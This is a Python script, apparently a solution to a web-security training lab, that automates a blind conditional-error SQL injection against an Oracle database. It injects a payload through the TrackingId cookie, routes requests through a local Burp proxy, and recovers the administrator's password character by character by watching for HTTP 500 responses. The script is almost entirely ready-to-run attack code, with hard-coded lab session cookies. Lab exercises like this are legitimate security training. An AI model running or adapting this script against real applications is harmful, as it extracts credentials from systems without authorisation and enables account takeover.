
import sys
import httpx
import urllib.parse


# Burp Suite proxy
PROXY = "http://127.0.0.1:8080"


def sqli_password(url):
    password_extracted = ""

    # HTTP/2 client through Burp
    with httpx.Client(
        http2=True,
        verify=False,
        proxy=PROXY,
        timeout=15.0
    ) as client:

        for i in range(1, 21):

            for j in range(32, 126):

                # Oracle conditional-error SQL injection
                sqli_payload = (
                    "' || (select CASE WHEN (1=1) "
                    "THEN TO_CHAR(1/0) ELSE '' END "
                    "FROM users "
                    "WHERE username='administrator' "
                    "AND ascii(substr(password,%s,1))='%s' "
                    ") || '"
                    % (i, j)
                )

                # URL encode payload
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)

                # Lab cookies
                cookies = {
                    "TrackingId": (
                        "uAYbMbnwMc7xAHb4"
                        + sqli_payload_encoded
                    ),
                    "session": (
                        "PAEy1ZMpT8eUmpbDN9RQrGOr9d4FQJH2"
                    )
                }

                try:
                    r = client.get(
                        url,
                        cookies=cookies
                    )

                except httpx.RequestError as e:
                    print("\n[-] Request failed:", e)
                    return

                # HTTP 500 = condition is TRUE
                if r.status_code == 500:

                    password_extracted += chr(j)

                    sys.stdout.write(
                        "\r" + password_extracted
                    )
                    sys.stdout.flush()

                    break

                else:

                    sys.stdout.write(
                        "\r"
                        + password_extracted
                        + chr(j)
                    )
                    sys.stdout.flush()

        print()


def main():

    if len(sys.argv) != 2:

        print("(+) Usage: %s <url>" % sys.argv[0])
        print(
            "(+) Example: %s "
            "https://example.web-security-academy.net/"
            % sys.argv[0]
        )

        sys.exit(1)

    url = sys.argv[1]

    print("(+) Retrieving administrator password...")

    sqli_password(url)


if __name__ == "__main__":
    main()

